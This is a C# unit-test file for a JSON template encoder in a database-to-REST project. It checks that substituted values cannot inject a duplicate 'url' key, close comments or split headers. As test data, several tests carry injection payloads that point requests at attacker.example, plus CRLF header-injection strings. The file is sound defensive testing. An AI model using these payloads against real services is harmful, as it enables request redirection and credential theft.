using System.Text.Json;
using Com.H.Data.Common;
using DBToRestAPI.Services.HttpExecutor.Internal;

namespace DBToRestAPI.Tests.HttpExecutor;

/// <summary>
/// Tests for <see cref="EmbeddedHttpTemplate"/>, the context-aware encoder that stops a value
/// substituted into a {http{...}http} block from breaking out of the JSON string it sits in.
///
/// Background: the block is JSON held as text, and {{markers}} are filled in before it is parsed.
/// A value carrying a double quote used to close the string and append sibling keys; because
/// System.Text.Json keeps the LAST duplicate key, a caller could replace "url" outright and
/// redirect the call - together with the block's credential headers - to any host.
/// </summary>
public class EmbeddedHttpTemplateTests
{
    // The default {{ }} / {j{ }} pattern from regex.xml, as registered in qParams by the controller.
    private const string DefaultMarkerRegex = @"(?<open_marker>\{\{|\{j\{)(?<param>.*?)?(?<close_marker>\}\})";

    // The default previous-query pattern: {{ }} or {pq{ }}.
    private const string PreviousQueryRegex = @"(?<open_marker>\{\{|\{pq\{)(?<param>.*?)?(?<close_marker>\}\})";

    // A documented custom delimiter (docs/tutorial/07-regex-validation.md): ||name||.
    private const string PipeMarkerRegex = @"(?<open_marker>\|\|)(?<param>.*?)?(?<close_marker>\|\|)";

    #region MarkersInsideJsonStrings - classification

    [Fact]
    public void Classify_MarkerInsideStringValue_IsEscaped()
    {
        var template = """{"url": "https://internal/api?x={{p}}"}""";

        var inside = EmbeddedHttpTemplate.MarkersInsideJsonStrings(template, out var mixed);

        Assert.Contains("p", inside);
        Assert.Empty(mixed);
    }

    [Fact]
    public void Classify_StructuralMarker_IsLeftRaw()
    {
        // "body": {{obj}} deliberately injects a whole JSON document; escaping it would break it.
        var template = """{"url": "https://internal/api", "body": {{obj}}}""";

        var inside = EmbeddedHttpTemplate.MarkersInsideJsonStrings(template, out var mixed);

        Assert.DoesNotContain("obj", inside);
        Assert.Empty(mixed);
    }

    [Fact]
    public void Classify_SameMarkerInBothContexts_IsEscapedAndReported()
    {
        var template = """{"url": "https://internal/api?x={{v}}", "body": {{v}}}""";

        var inside = EmbeddedHttpTemplate.MarkersInsideJsonStrings(template, out var mixed);

        Assert.Contains("v", inside);   // security wins...
        Assert.Contains("v", mixed);    // ...and the caller is told the block needs rewriting
    }

    [Fact]
    public void Classify_PrefixedMarkers_UseInnerName()
    {
        var template = """{"url": "{s{base_url}}/x", "headers": {"X-Key": "{h{X-Key}}", "X-User": "{auth{email}}"}}""";

        var inside = EmbeddedHttpTemplate.MarkersInsideJsonStrings(template, out _);

        Assert.Contains("base_url", inside);
        Assert.Contains("X-Key", inside);
        Assert.Contains("email", inside);
    }

    [Fact]
    public void Classify_NamesAreCaseInsensitive()
    {
        var template = """{"url": "https://internal/api?x={{Param}}"}""";

        var inside = EmbeddedHttpTemplate.MarkersInsideJsonStrings(template, out _);

        Assert.Contains("PARAM", inside);
    }

    [Fact]
    public void Classify_EscapedQuoteInsideString_DoesNotEndTheString()
    {
        // The \" is an escaped quote, so the marker after it is still inside the string.
        var template = """{"note": "say \"hi\" to {{name}}"}""";

        var inside = EmbeddedHttpTemplate.MarkersInsideJsonStrings(template, out _);

        Assert.Contains("name", inside);
    }

    [Fact]
    public void Classify_QuoteInsideLineComment_IsIgnored()
    {
        // JsonRequestParser accepts comments; a stray quote in one must not flip string state
        // and misclassify everything after it.
        var template = "{\n  // a \" stray quote in a comment\n  \"url\": \"https://internal/api?x={{p}}\",\n  \"body\": {{obj}}\n}";

        var inside = EmbeddedHttpTemplate.MarkersInsideJsonStrings(template, out var mixed);

        Assert.Contains("p", inside);
        Assert.DoesNotContain("obj", inside);
        Assert.Empty(mixed);
    }

    [Fact]
    public void Classify_QuoteInsideBlockComment_IsIgnored()
    {
        var template = "{ /* a \" quote */ \"url\": \"https://internal/api?x={{p}}\", \"body\": {{obj}} }";

        var inside = EmbeddedHttpTemplate.MarkersInsideJsonStrings(template, out _);

        Assert.Contains("p", inside);
        Assert.DoesNotContain("obj", inside);
    }

    [Theory]
    [InlineData("{\"url\": \"https://h/x\", /* id {{id}} */ \"skip\": true, \"body\": {{id}}}")]
    [InlineData("{\"url\": \"https://h/x\",\n // sends {{id}}\n \"skip\": true, \"body\": {{id}}}")]
    [InlineData("{\"url\": \"https://h/x\", \"skip\": true, \"body\": {{id}} /* {{id}} unterminated")]
    public void Classify_ANameAlsoUsedInAComment_IsNotStructuralOnly(string template)
    {
        // Every use of a name gets the same text, so the comment's copy must be escaped too.
        var contexts = EmbeddedHttpTemplate.ClassifyMarkers(template);

        Assert.False(contexts.IsStructuralOnly("id"));
        Assert.Contains("id", contexts.Mixed);
    }

    [Fact]
    public void Fill_ANameInACommentAndOutsideAString_CannotDropTheKeysAfterTheComment()
    {
        var template = "{\"url\": \"https://internal/api\", /* id {{id}} */ \"skip\": true, \"body\": {{id}}}";

        var filled = FillLikeController(template, new() { ["id"] = "*/ } //" });

        // The block no longer parses, so its call fails; it can't lose its skip and go out.
        Assert.ThrowsAny<Exception>(() => JsonRequestParser.Parse(filled));
        Assert.DoesNotContain("*/ } //", filled);
    }

    [Fact]
    public void Classify_AMarkerStartingInsideAnother_IsNotStructuralOnly()
    {
        // {s{a {{id}} is one settings marker to its pattern, and {{id}} starts inside it.
        var template = "{\"url\": \"https://h/x?a={s{a {{id}}\", \"skip\": true, \"body\": {{id}}}";

        var contexts = EmbeddedHttpTemplate.ClassifyMarkers(template, [DefaultMarkerRegex, DBToRestAPI.Settings.DefaultRegex.DefaultSettingsVariablesPattern]);

        Assert.False(contexts.IsStructuralOnly("id"));
    }

    [Fact]
    public void Classify_DoubleSlashInsideUrlString_IsNotAComment()
    {
        // The "//" in https:// sits inside a string, so it must not swallow the rest of the line.
        var template = """{"url": "https://internal/api", "headers": {"X-Trace": "{{trace}}"}, "body": {{obj}}}""";

        var inside = EmbeddedHttpTemplate.MarkersInsideJsonStrings(template, out _);

        Assert.Contains("trace", inside);
        Assert.DoesNotContain("obj", inside);
    }

    [Fact]
    public void Classify_MarkerInsideNestedObjectAndArray_IsEscaped()
    {
        var template = """{"url": "https://internal/api", "body": {"tags": ["{{tag}}"], "who": {"name": "{{name}}"}}}""";

        var inside = EmbeddedHttpTemplate.MarkersInsideJsonStrings(template, out _);

        Assert.Contains("tag", inside);
        Assert.Contains("name", inside);
    }

    [Theory]
    [InlineData("")]
    [InlineData(null)]
    public void Classify_EmptyTemplate_ReturnsEmptySets(string? template)
    {
        var inside = EmbeddedHttpTemplate.MarkersInsideJsonStrings(template!, out var mixed);

        Assert.Empty(inside);
        Assert.Empty(mixed);
    }

    #endregion

    #region JsonEscape

    [Fact]
    public void JsonEscape_WellFormedValue_PassesThroughUnchanged()
    {
        const string value = "784-1990-1234567-1 / John O'Neil <j@x.io> ?a=1&b=2 #frag ünïcödé 😀";

        Assert.Equal(value, EmbeddedHttpTemplate.JsonEscape(value));
    }

    [Theory]
    [InlineData("\"", "\\\"")]
    [InlineData("\\", "\\\\")]
    [InlineData("\n", "\\n")]
    [InlineData("\r", "\\r")]
    [InlineData("\t", "\\t")]
    [InlineData("\b", "\\b")]
    [InlineData("\f", "\\f")]
    [InlineData("", "\\u0001")]
    [InlineData("", "\\u001f")]
    public void JsonEscape_StructuralAndControlCharacters_AreEscaped(string input, string expected)
    {
        Assert.Equal(expected, EmbeddedHttpTemplate.JsonEscape(input));
    }

    [Theory]
    [InlineData(null)]
    [InlineData("")]
    public void JsonEscape_NullOrEmpty_ReturnsEmpty(string? input)
    {
        Assert.Equal(string.Empty, EmbeddedHttpTemplate.JsonEscape(input));
    }

    [Fact]
    public void JsonEscape_Output_RoundTripsAsAJsonString()
    {
        // Whatever goes in, wrapping the output in quotes must give a JSON string literal that
        // deserializes back to the original value.
        const string value = "a\",\"url\":\"https://attacker.example\\ \n\t";

        var json = "\"" + EmbeddedHttpTemplate.JsonEscape(value) + "\"";

        Assert.Equal(value, JsonSerializer.Deserialize<string>(json));
    }

    #endregion

    #region ContainsHeaderBreak

    [Theory]
    [InlineData("a\r\nX-Injected: b", true)]
    [InlineData("a\nX-Injected: b", true)]
    [InlineData("a\rX-Injected: b", true)]
    [InlineData("plain value", false)]
    [InlineData("", false)]
    [InlineData(null, false)]
    public void ContainsHeaderBreak_DetectsCrAndLfOnly(string? value, bool expected)
    {
        Assert.Equal(expected, EmbeddedHttpTemplate.ContainsHeaderBreak(value));
    }

    #endregion

    #region End to end - the fill the controller actually performs

    /// <summary>
    /// Mirrors ApiController's embedded-HTTP fill: classify the markers with the patterns the
    /// block is filled with, then Fill with EmbeddedHttpTemplate.ConvertValue.
    /// </summary>
    private static string FillLikeController(string template, Dictionary<string, object?> values)
        => FillWithParams(template, new List<DbQueryParams>
        {
            new() { DataModel = values, QueryParamsRegex = DefaultMarkerRegex }
        });

    private static string FillWithParams(string template, List<DbQueryParams> qParams)
    {
        var contexts = EmbeddedHttpTemplate.ClassifyMarkers(template, qParams.Select(x => x.QueryParamsRegex));

        return template.Fill(
            qParams,
            valueConverter: (name, value) => EmbeddedHttpTemplate.ConvertValue(contexts, name, value));
    }

    [Fact]
    public void Fill_SsrfPayloadInUrlMarker_CannotReplaceTheUrl()
    {
        // The original exploit: a value that closes the string and appends a second "url" key.
        var template = """
            {
              "url": "https://internal/api?x={{p}}",
              "headers": { "x-api-key": "secret" }
            }
            """;
        const string payload = "a\",\"url\":\"https://attacker.example";

        var filled = FillLikeController(template, new() { ["p"] = payload });
        var request = JsonRequestParser.Parse(filled);

        // Still one url key, still the internal host, and the payload is trapped inside it as data.
        Assert.StartsWith("https://internal/api?x=", request.Url);
        Assert.Equal("https://internal/api?x=" + payload, request.Url);
        Assert.Equal("secret", request.Headers!["x-api-key"]);
    }

    [Fact]
    public void Fill_WellFormedValue_IsUnchanged()
    {
        var template = """{"url": "https://internal/api?id={{id}}"}""";

        var filled = FillLikeController(template, new() { ["id"] = "784-1990-1234567-1" });

        Assert.Equal("https://internal/api?id=784-1990-1234567-1", JsonRequestParser.Parse(filled).Url);
    }

    [Fact]
    public void Fill_StructuralBodyMarker_StillInjectsAJsonDocument()
    {
        // The supported "inject a whole document" pattern must keep working unescaped.
        var template = """{"url": "https://internal/api", "method": "POST", "body": {{body_add}}}""";

        var filled = FillLikeController(template, new() { ["body_add"] = """{"a": 1, "b": [1, 2]}""" });
        var request = JsonRequestParser.Parse(filled);

        var body = Assert.IsType<JsonElement>(request.Body);
        Assert.Equal(1, body.GetProperty("a").GetInt32());
        Assert.Equal(2, body.GetProperty("b").GetArrayLength());
    }

    [Fact]
    public void Fill_QueryStringMarkerValue_PassesThroughUntouched()
    {
        // A whole query string ("?scenario=x&shape=y") has no JSON-structural characters, so it
        // must arrive exactly as written.
        var template = """{"url": "https://internal/api{{url_suffix}}"}""";

        var filled = FillLikeController(template, new() { ["url_suffix"] = "?scenario=full&shape=wide" });

        Assert.Equal("https://internal/api?scenario=full&shape=wide", JsonRequestParser.Parse(filled).Url);
    }

    [Fact]
    public void Fill_StructuralMarker_InjectionAttempt_StaysAString()
    {
        // A previous query's NULL column lets a request field fill a raw marker. Inserted raw,
        // this value added a second "url" key, and the LAST duplicate wins, so the call and its
        // credential headers went to the caller's host.
        var template = """
            {
              "url": "https://internal/api",
              "method": "POST",
              "headers": { "x-api-key": "secret" },
              "body": {{payload}}
            }
            """;
        const string payload = "1, \"url\": \"https://attacker.example\"";

        var filled = FillLikeController(template, new() { ["payload"] = payload });
        var request = JsonRequestParser.Parse(filled);

        Assert.Equal("https://internal/api", request.Url);
        Assert.Equal("secret", request.Headers!["x-api-key"]);
        var body = Assert.IsType<JsonElement>(request.Body);
        Assert.Equal(JsonValueKind.String, body.ValueKind);
        Assert.Equal(payload, body.GetString());
    }

    [Theory]
    [InlineData("""{"a": 1}, "url": "https://attacker.example" """)] // a valid object followed by more keys
    [InlineData("""[1, 2]] , "url": "https://attacker.example" """)]
    [InlineData("not json")]
    [InlineData("")]
    public void ToStructuralJson_AnythingButOneJsonValue_BecomesAString(string value)
    {
        var json = EmbeddedHttpTemplate.ToStructuralJson(value);

        Assert.Equal(value, JsonSerializer.Deserialize<string>(json));
    }

    [Fact]
    public void ToStructuralJson_UnpairedSurrogate_BecomesAString_WithoutThrowing()
    {
        // JsonDocument.Parse throws ArgumentException, not JsonException, for text it can't
        // transcode. Escaping the check, it failed the whole request instead of one value.
        var json = EmbeddedHttpTemplate.ToStructuralJson("a\uD800b");

        Assert.Equal("\"a\uD800b\"", json);
    }

    [Theory]
    [InlineData("""{"a": 1, "b": [1, 2]}""", """{"a":1,"b":[1,2]}""")]
    [InlineData("[1, 2, 3]", "[1,2,3]")]
    [InlineData("\"already a string\"", "\"already a string\"")]
    [InlineData("42", "42")]
    [InlineData("-1.5e3", "-1.5e3")]
    [InlineData("true", "true")]
    [InlineData("null", "null")]
    [InlineData("  {\"a\": 1}\n", """{"a":1}""")]                         // whitespace around one value is fine
    [InlineData("""1 // , "url": "https://attacker.example" """, "1")] // a comment can't carry text along
    [InlineData("1 /* why */", "1")]                                      // the block's parser skips comments, so this does too
    [InlineData("{\"a\": 1, // first\n \"b\": 2,}", """{"a":1,"b":2}""")] // and allows trailing commas
    public void ToStructuralJson_OneJsonValue_IsWrittenBackCompact(string value, string expected)
    {
        Assert.Equal(expected, EmbeddedHttpTemplate.ToStructuralJson(value));
    }

    [Fact]
    public void ToStructuralJson_TypedValues_BecomeJson()
    {
        // A JSON body's true arrives as a .NET bool, whose text is "True", which is not JSON.
        Assert.Equal("true", EmbeddedHttpTemplate.ToStructuralJson(true));
        Assert.Equal("false", EmbeddedHttpTemplate.ToStructuralJson(false));
        Assert.Equal("null", EmbeddedHttpTemplate.ToStructuralJson(null));
        Assert.Equal("1234567", EmbeddedHttpTemplate.ToStructuralJson(1234567d));
        Assert.Equal("12.5", EmbeddedHttpTemplate.ToStructuralJson(12.5m));
        // A value that is not JSON text, such as a date from a previous query, becomes a string.
        var date = new DateTime(2026, 10, 6, 14, 30, 0);
        Assert.Equal(JsonValueKind.String,
            JsonDocument.Parse(EmbeddedHttpTemplate.ToStructuralJson(date)).RootElement.ValueKind);
    }

    [Fact]
    public void ToStructuralJson_Number_IgnoresTheServerCulture()
    {
        var previous = System.Globalization.CultureInfo.CurrentCulture;
        try
        {
            // A culture that writes 1,5 would have produced invalid JSON in the raw insert.
            System.Globalization.CultureInfo.CurrentCulture = new System.Globalization.CultureInfo("de-DE");
            Assert.Equal("1.5", EmbeddedHttpTemplate.ToStructuralJson(1.5d));
        }
        finally
        {
            System.Globalization.CultureInfo.CurrentCulture = previous;
        }
    }

    [Fact]
    public void Fill_CustomDelimiterInsideAString_IsEscapedNotQuoted()
    {
        // A route can override the patterns (json_variables_pattern and the others). Classified
        // with the default pattern only, ||id|| looked structural and got wrapped in quotes
        // inside the url string, which broke a working configuration.
        var template = """{"url": "https://internal/api/items?id=||id||", "method": "GET"}""";
        var qParams = new List<DbQueryParams>
        {
            new() { DataModel = new Dictionary<string, object?> { ["id"] = "abc" }, QueryParamsRegex = PipeMarkerRegex }
        };

        Assert.Equal("https://internal/api/items?id=abc", JsonRequestParser.Parse(FillWithParams(template, qParams)).Url);

        qParams[0].DataModel = new Dictionary<string, object?> { ["id"] = "a\",\"url\":\"https://attacker.example" };
        Assert.StartsWith("https://internal/api/items?id=", JsonRequestParser.Parse(FillWithParams(template, qParams)).Url);
    }

    [Fact]
    public void Fill_CustomDelimiterOutsideAString_InsertsOneValue()
    {
        var template = """{"url": "https://internal/api", "method": "POST", "body": ||doc||}""";
        var qParams = new List<DbQueryParams>
        {
            new() { DataModel = new Dictionary<string, object?> { ["doc"] = """{"a": 1}""" }, QueryParamsRegex = PipeMarkerRegex }
        };

        var body = Assert.IsType<JsonElement>(JsonRequestParser.Parse(FillWithParams(template, qParams)).Body);

        Assert.Equal(1, body.GetProperty("a").GetInt32());
    }

    [Fact]
    public void Fill_MixedContextMarker_CannotDropTheRestOfTheBody()
    {
        // id is used in the url string and as a raw body value, so it gets string escaping in
        // both places. Plain escaping left } and // alone, so a value could close the body
        // object early and comment out the keys after it.
        var template = "{\"url\": \"https://internal/api?id={{id}}\", \"method\": \"POST\",\n"
                     + " \"body\": {\"id\": {{id}}, \"tenant\": 7}\n}";

        var attack = FillLikeController(template, new() { ["id"] = "1} //" });
        Assert.ThrowsAny<Exception>(() => JsonRequestParser.Parse(attack)); // the call fails; nothing is dropped

        var plain = FillLikeController(template, new() { ["id"] = "42" });
        var request = JsonRequestParser.Parse(plain);
        Assert.Equal("https://internal/api?id=42", request.Url);
        Assert.Equal(7, Assert.IsType<JsonElement>(request.Body).GetProperty("tenant").GetInt32());
    }

    [Fact]
    public void Fill_MarkerInAComment_CannotCloseIt()
    {
        var template = "{\n  /* trace: {{trace}} */\n  \"url\": \"https://internal/api\"\n}";

        var filled = FillLikeController(template, new() { ["trace"] = "*/ \"url\": \"https://attacker.example\", /*" });

        Assert.Equal("https://internal/api", JsonRequestParser.Parse(filled).Url);
    }

    [Fact]
    public void Fill_MarkerInsideAnInsertedValue_StaysAsWritten()
    {
        // The fill writes every value in at the end, so a marker inside a previous query's
        // document is never filled from the request: the value arrives as the query returned it.
        var template = """{"url": "https://internal/api", "method": "POST", "body": {pq{doc}}}""";
        var qParams = new List<DbQueryParams>
        {
            new() { DataModel = new Dictionary<string, object?> { ["note"] = "plain \"quoted\"" }, QueryParamsRegex = DefaultMarkerRegex },
            new() { DataModel = new Dictionary<string, object?> { ["doc"] = """{"a": "x{{note}}y"}""" }, QueryParamsRegex = PreviousQueryRegex },
        };

        var body = Assert.IsType<JsonElement>(JsonRequestParser.Parse(FillWithParams(template, qParams)).Body);

        Assert.Equal("x{{note}}y", body.GetProperty("a").GetString());
    }

    [Fact]
    public void Classify_UsesThePatternsGiven()
    {
        var template = """{"url": "https://internal/api?id=||id||", "body": ||doc||, "x": "{{other}}"}""";

        var contexts = EmbeddedHttpTemplate.ClassifyMarkers(template, [PipeMarkerRegex]);

        Assert.Contains("id", contexts.InsideString);
        Assert.Contains("doc", contexts.Structural);
        Assert.DoesNotContain("other", contexts.InsideString); // not a marker for these patterns
        Assert.True(contexts.IsStructuralOnly("doc"));
        Assert.False(contexts.IsStructuralOnly("id"));
        Assert.False(contexts.IsStructuralOnly("unknown"));
    }

    [Fact]
    public void Classify_SlashesInAMarkerName_AreNotAComment()
    {
        // A claim type such as {auth{http://...}} has // in its name.
        var template = """{"body": {"tid": {auth{http://schemas.microsoft.com/identity/claims/tenantid}}, "a": "{{a}}"}}""";

        var contexts = EmbeddedHttpTemplate.ClassifyMarkers(template);

        Assert.Contains("http://schemas.microsoft.com/identity/claims/tenantid", contexts.Structural);
        Assert.Contains("a", contexts.InsideString);
    }

    [Fact]
    public void JsonEscapeForAnyPosition_EscapesStructuralCharacters()
    {
        static string U(char c) => (char)92 + "u" + ((int)c).ToString("x4"); // 92 is the backslash

        Assert.Equal("plain", EmbeddedHttpTemplate.JsonEscapeForAnyPosition("plain"));
        Assert.Equal("a" + U('/') + "b" + U(':') + "c" + U(',') + "d", EmbeddedHttpTemplate.JsonEscapeForAnyPosition("a/b:c,d"));
        Assert.Equal(U('{') + U('[') + U('*') + U(']') + U('}'), EmbeddedHttpTemplate.JsonEscapeForAnyPosition("{[*]}"));
        Assert.Equal("q\\\"", EmbeddedHttpTemplate.JsonEscapeForAnyPosition("q\""));
    }

    [Fact]
    public void JsonEscapeForAnyPosition_DecodesToTheSameTextInsideAString()
    {
        const string value = "https://x/y?a=1,b:2 {*} [ok] \" \\ end";

        var json = "\"" + EmbeddedHttpTemplate.JsonEscapeForAnyPosition(value) + "\"";

        Assert.Equal(value, JsonSerializer.Deserialize<string>(json));
    }

    [Fact]
    public void Fill_StructuralBoolAndNumber_ProduceValidJson()
    {
        var template = """{"url": "https://internal/api", "method": "POST", "body": {"active": {{active}}, "count": {{count}}}}""";

        var filled = FillLikeController(template, new() { ["active"] = true, ["count"] = 3d });
        var body = Assert.IsType<JsonElement>(JsonRequestParser.Parse(filled).Body);

        Assert.True(body.GetProperty("active").GetBoolean());
        Assert.Equal(3, body.GetProperty("count").GetInt32());
    }

    #endregion
}
